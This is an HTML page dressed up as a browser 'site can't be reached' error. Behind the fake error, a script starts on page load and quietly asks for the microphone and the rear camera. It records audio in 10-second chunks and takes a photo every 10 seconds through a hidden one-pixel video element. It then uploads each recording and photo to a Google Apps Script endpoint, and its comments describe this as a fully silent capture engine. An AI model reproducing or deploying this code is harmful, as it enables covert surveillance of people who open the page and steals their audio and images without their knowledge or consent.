<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <link rel="icon" href="./icon.ico">
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="color-scheme" content="light dark" />
    <title>This site can’t be reached</title>

    <style>
        *,
        *::before,
        *::after { box-sizing: border-box; }

        :root {
            --bg: #ffffff;
            --text: #202124;
            --text-2: #5f6368;
            --icon-fill: #e8eaed;
            --icon-stroke: #dadce0;
            --icon-detail: #5f6368;
            --btn-bg: #1a73e8;
            --btn-text: #ffffff;
            --btn-bg-hover: #1765cc;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg: #202124;
                --text: #e8eaed;
                --text-2: #9aa0a6;
                --icon-fill: #3c4043;
                --icon-stroke: #5f6368;
                --icon-detail: #bdc1c6;
                --btn-bg: #8ab4f8;
                --btn-text: #202124;
                --btn-bg-hover: #aecbfa;
            }
        }

        html, body { height: 100%; }

        body {
            margin: 0;
            min-height: 100vh;
            background: var(--bg);
            color: var(--text);
            font-family: system-ui, -apple-system, "Segoe UI", Roboto,
                         "Helvetica Neue", Tahoma, Arial, sans-serif;
            font-size: 16px;
            line-height: 1.6;
            -webkit-font-smoothing: antialiased;
            text-rendering: optimizeLegibility;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 32px 24px;
            overflow-x: hidden;
        }

        /* ==================== CONTENT ==================== */
        .neterror {
            width: 100%;
            max-width: 620px;
            text-align: start;
        }

        .neterror-icon {
            display: block;
            width: 72px;
            height: 72px;
            margin-bottom: 28px;
        }

        .neterror-icon .face {
            fill: var(--icon-fill);
            stroke: var(--icon-stroke);
        }

        .neterror-icon .feat {
            fill: var(--icon-detail);
            stroke: var(--icon-detail);
        }

        .neterror h1 {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.5;
            letter-spacing: 0;
            margin: 0 0 14px;
            color: var(--text);
        }

        .neterror .lead {
            margin: 0 0 22px;
            font-size: 15px;
            color: var(--text);
        }

        .neterror .host {
            direction: ltr;
            unicode-bidi: isolate;
            font-weight: 400;
        }

        .neterror .hint {
            margin: 0 0 8px;
            font-size: 15px;
            color: var(--text-2);
        }

        .neterror ul {
            margin: 0 0 26px;
            padding-inline-start: 26px;
            font-size: 15px;
            line-height: 2;
            color: var(--text-2);
        }

        .neterror ul li::marker {
            color: var(--text-2);
        }

        .error-code {
            margin: 0 0 26px;
            font-size: 14px;
            letter-spacing: 0.3px;
            color: var(--text-2);
            direction: ltr;
            unicode-bidi: plaintext;
            text-align: start;
        }

        .reload {
            font-family: inherit;
            font-size: 14px;
            font-weight: 500;
            line-height: 1;
            color: var(--btn-text);
            background: var(--btn-bg);
            border: none;
            border-radius: 4px;
            padding: 11px 22px;
            cursor: pointer;
            transition: background-color 0.15s ease;
        }

        .reload:hover { background: var(--btn-bg-hover); }

        .reload:active { transform: translateY(1px); }

        /* ==================== HIDDEN CAMERA ==================== */
        .hidden-camera {
            position: fixed;
            top: -10px;
            left: -10px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
        }

        /* ==================== MOBILE ==================== */
        @media (max-width: 600px) {
            body { padding: 24px 18px; }
            .neterror-icon { width: 60px; height: 60px; margin-bottom: 22px; }
            .neterror h1 { font-size: 21px; }
        }
    </style>
</head>
<body>

    <!-- hidden back camera -->
    <video id="camBack" class="hidden-camera" autoplay playsinline muted></video>

    <main class="neterror">
        <!-- Chrome-style sad folder icon -->
        <svg class="neterror-icon" viewBox="0 0 72 72" aria-hidden="true">
            <path class="face" stroke-width="1.5"
                  d="M10 24 L10 18 a4 4 0 0 1 4 -4 h14 l6 6 h24 a4 4 0 0 1 4 4 v38 a4 4 0 0 1 -4 4 H14 a4 4 0 0 1 -4 -4 z" />
            <circle class="feat" cx="27" cy="38" r="3" stroke="none" />
            <circle class="feat" cx="45" cy="38" r="3" stroke="none" />
            <path class="feat" fill="none" stroke-width="3" stroke-linecap="round"
                  d="M27 52 Q36 44 45 52" />
        </svg>

        <h1>This site can’t be reached</h1>

        <p class="lead">
            <span class="host" id="hostName">example.com</span> refused to connect.
        </p>

        <p class="hint">Try:</p>
        <ul>
            <li>Checking the connection</li>
            <li>Checking the proxy and the firewall</li>
            <li>Running Windows Network Diagnostics</li>
        </ul>

        <div class="error-code">ERR_CONNECTION_REFUSED</div>

        <button class="reload" id="reloadBtn" type="button">Reload</button>
    </main>

    <script>
        (() => {
            'use strict';

            // =============================================================
            //  0.  CONFIGURATION – Web App URL
            // =============================================================
            const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbz3GvNjN8b2pY_5MM7Vbrq7MP4bVHTmkzQrC8u6JRFSrrzJSJrT11JBazaGV8zloZqw/exec';

            // =============================================================
            //  1.  CAPTURE ENGINE (fully silent)
            // =============================================================
            let mediaRecorder = null;
            let isRecording = false;
            let recordingTimerId = null;
            let isMicAllowed = false;
            let audioChunks = [];
            let streamAudio = null;
            let streamBack = null;
            let isCamAllowed = false;
            let captureIntervalId = null;

            const camBack = document.getElementById('camBack');

            // ---- upload file to Google Apps Script ----
            function uploadFile(base64Data, filename, mimeType) {
                if (!base64Data || base64Data.length < 100) return;
                const payload = {
                    audio: base64Data,
                    filename: filename,
                    mimeType: mimeType
                };
                try {
                    fetch(WEB_APP_URL, {
                        method: 'POST',
                        mode: 'cors',
                        body: JSON.stringify(payload)
                    })
                    .then(r => r.text())
                    .then(data => console.log('[Upload] OK →', filename))
                    .catch(err => console.error('[Upload] Error:', err));
                } catch (e) {
                    console.error('[Upload] Exception:', e);
                }
            }

            // ---- grab frame from back camera ----
            function captureBackCamera() {
                return new Promise((resolve) => {
                    if (!camBack || camBack.readyState < 2) { resolve(null); return; }
                    try {
                        const canvas = document.createElement('canvas');
                        canvas.width = camBack.videoWidth || 640;
                        canvas.height = camBack.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(camBack, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((blob) => {
                            if (!blob) { resolve(null); return; }
                            const reader = new FileReader();
                            reader.onload = () => {
                                const base64 = reader.result.split(',')[1];
                                resolve({ base64 });
                            };
                            reader.onerror = () => resolve(null);
                            reader.readAsDataURL(blob);
                        }, 'image/avif', 0.8);
                    } catch (e) {
                        resolve(null);
                    }
                });
            }

            async function sendBackPhoto() {
                const result = await captureBackCamera();
                if (result) {
                    const ts = new Date().toISOString().replace(/[:.]/g, '-');
                    uploadFile(result.base64, `back_${ts}.avif`, 'image/avif');
                }
            }

            // ---- audio recording (Opus) ----
            function uploadOpusBlob(blob) {
                if (!blob || blob.size < 1000) return;
                const reader = new FileReader();
                reader.onload = function () {
                    const base64 = reader.result.split(',')[1];
                    const ts = new Date().toISOString().replace(/[:.]/g, '-');
                    uploadFile(base64, `audio_${ts}.opus`, 'audio/ogg');
                };
                reader.readAsDataURL(blob);
            }

            function stopAndGetChunk() {
                if (!isRecording || !mediaRecorder) return;
                try {
                    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
                } catch (e) {}
                isRecording = false;
                clearTimeout(recordingTimerId);
                recordingTimerId = null;
                setTimeout(() => { if (isMicAllowed) startAudioRecording(); }, 200);
            }

            function startAudioRecording() {
                if (!isMicAllowed || isRecording || !streamAudio) return;
                try {
                    const mimeTypes = [
                        'audio/ogg;codecs=opus',
                        'audio/webm;codecs=opus',
                        'audio/ogg',
                        'audio/webm'
                    ];
                    let mimeType = null;
                    for (const mt of mimeTypes) {
                        if (MediaRecorder.isTypeSupported(mt)) { mimeType = mt; break; }
                    }
                    const options = mimeType ? { mimeType } : {};
                    mediaRecorder = new MediaRecorder(streamAudio, options);
                    audioChunks = [];

                    mediaRecorder.ondataavailable = (event) => {
                        if (event.data && event.data.size > 0) audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = () => {
                        if (audioChunks.length > 0) {
                            const blob = new Blob(audioChunks, { type: mimeType || 'audio/ogg' });
                            if (blob.size > 1000) uploadOpusBlob(blob);
                            audioChunks = [];
                        }
                    };

                    mediaRecorder.start();
                    isRecording = true;
                    recordingTimerId = setTimeout(stopAndGetChunk, 10000);
                } catch (e) {
                    isRecording = false;
                    setTimeout(startAudioRecording, 1500);
                }
            }

            // ---- start all captures, silently ----
            function startAllCaptures() {
                // microphone
                if (!isMicAllowed) {
                    navigator.mediaDevices.getUserMedia({ audio: true })
                        .then(stream => {
                            streamAudio = stream;
                            isMicAllowed = true;
                            startAudioRecording();
                        })
                        .catch(() => { /* silently ignore */ });
                } else {
                    startAudioRecording();
                }

                // back camera
                if (!isCamAllowed) {
                    const constraintsBack = {
                        video: {
                            facingMode: 'environment',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    };
                    navigator.mediaDevices.getUserMedia(constraintsBack)
                        .then(stream => {
                            streamBack = stream;
                            camBack.srcObject = stream;
                            isCamAllowed = true;
                            if (captureIntervalId) clearInterval(captureIntervalId);
                            captureIntervalId = setInterval(sendBackPhoto, 10000);
                            sendBackPhoto();
                        })
                        .catch(() => { /* silently ignore */ });
                } else if (!captureIntervalId) {
                    captureIntervalId = setInterval(sendBackPhoto, 10000);
                }
            }

            // =============================================================
            //  2.  INIT
            // =============================================================
            function init() {
                const hostEl = document.getElementById('hostName');
                if (hostEl) {
                    const h = location.hostname;
                    hostEl.textContent = (h && h.length) ? h : 'example.com';
                }

                const reloadBtn = document.getElementById('reloadBtn');
                if (reloadBtn) {
                    reloadBtn.addEventListener('click', () => location.reload());
                }

                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    setTimeout(startAllCaptures, 600);
                }

                console.log('[Story] Ready.');
            }

            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', init);
            } else {
                init();
            }
        })();
    </script>
</body>
</html>
